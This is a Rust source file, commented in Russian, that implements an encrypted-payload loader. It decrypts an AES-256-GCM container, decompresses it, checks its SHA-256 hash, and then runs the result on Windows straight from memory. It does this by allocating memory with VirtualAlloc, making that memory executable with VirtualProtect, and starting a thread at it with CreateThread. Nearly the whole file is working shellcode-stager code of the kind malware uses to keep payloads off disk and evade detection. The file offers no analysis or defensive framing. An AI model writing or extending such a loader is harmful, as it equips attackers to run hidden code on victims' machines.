// in-memory выполнение зашифрованых пейлоадов
use anyhow::{Result, anyhow};
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use aes_gcm::aead::Aead;
use flate2::read::GzDecoder;
use std::io::Read;
use sha2::{Sha256, Digest};

// декриптуем и распаковываем контейнер
pub fn decrypt_container(encrypted_data: &[u8], key_hex: &str) -> Result<Vec<u8>> {
    // первые 12 байт — nonce
    if encrypted_data.len() < 12 {
        return Err(anyhow!("Container too small"));
    }

    let nonce_bytes = &encrypted_data[0..12];
    let ciphertext = &encrypted_data[12..];

    // aes-256-gcm декрипт
    let key_bytes = hex::decode(key_hex)?;
    if key_bytes.len() != 32 {
        return Err(anyhow!("Invalid key length"));
    }

    let cipher = Aes256Gcm::new_from_slice(&key_bytes)
        .map_err(|_| anyhow!("Invalid key"))?;
    let nonce = Nonce::from_slice(nonce_bytes);

    let decrypted = cipher.decrypt(nonce, ciphertext)
        .map_err(|_| anyhow!("Decryption failed - invalid key or corrupted data"))?;

    // формат: [4 байта длина][сжатые данные][паддинг]
    if decrypted.len() < 4 {
        return Err(anyhow!("Decrypted data too small"));
    }

    let length = u32::from_be_bytes([
        decrypted[0],
        decrypted[1],
        decrypted[2],
        decrypted[3],
    ]) as usize;

    if decrypted.len() < 4 + length {
        return Err(anyhow!("Invalid padding"));
    }

    let compressed = &decrypted[4..4 + length];

    // разжимаем
    let mut decoder = GzDecoder::new(compressed);
    let mut plaintext = Vec::new();
    decoder.read_to_end(&mut plaintext)?;

    Ok(plaintext)
}

// проверяем sha256
pub fn verify_hash(data: &[u8], expected_hash: &str) -> Result<()> {
    let mut hasher = Sha256::new();
    hasher.update(data);
    let hash = hex::encode(hasher.finalize());

    if hash.to_lowercase() != expected_hash.to_lowercase() {
        return Err(anyhow!("Hash mismatch: expected {}, got {}", expected_hash, hash));
    }

    Ok(())
}

// выполняем пейлоад прямо из памяти
#[cfg(windows)]
pub fn execute_from_memory(payload: &[u8]) -> Result<()> {
    use std::ptr;
    use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
    use winapi::um::processthreadsapi::CreateThread;
    use winapi::um::synchapi::WaitForSingleObject;
    use winapi::um::winbase::INFINITE;

    unsafe {
        // выделяем память
        let mem = VirtualAlloc(
            ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if mem.is_null() {
            return Err(anyhow!("VirtualAlloc failed"));
        }

        // копируем пейлоад
        ptr::copy_nonoverlapping(payload.as_ptr(), mem as *mut u8, payload.len());

        // меняем защиту на исполняемую
        let mut old_protect = 0;
        if VirtualProtect(mem, payload.len(), PAGE_EXECUTE_READ, &mut old_protect) == 0 {
            return Err(anyhow!("VirtualProtect failed"));
        }

        // запускаем поток
        let thread = CreateThread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(mem)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        if thread.is_null() {
            return Err(anyhow!("CreateThread failed"));
        }

        WaitForSingleObject(thread, INFINITE);
    }

    Ok(())
}

#[cfg(not(windows))]
pub fn execute_from_memory(_payload: &[u8]) -> Result<()> {
    Err(anyhow!("In-memory execution only supported on Windows"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_decrypt_container() {
        let result = decrypt_container(&[1, 2, 3], "invalid");
        assert!(result.is_err());
    }
}
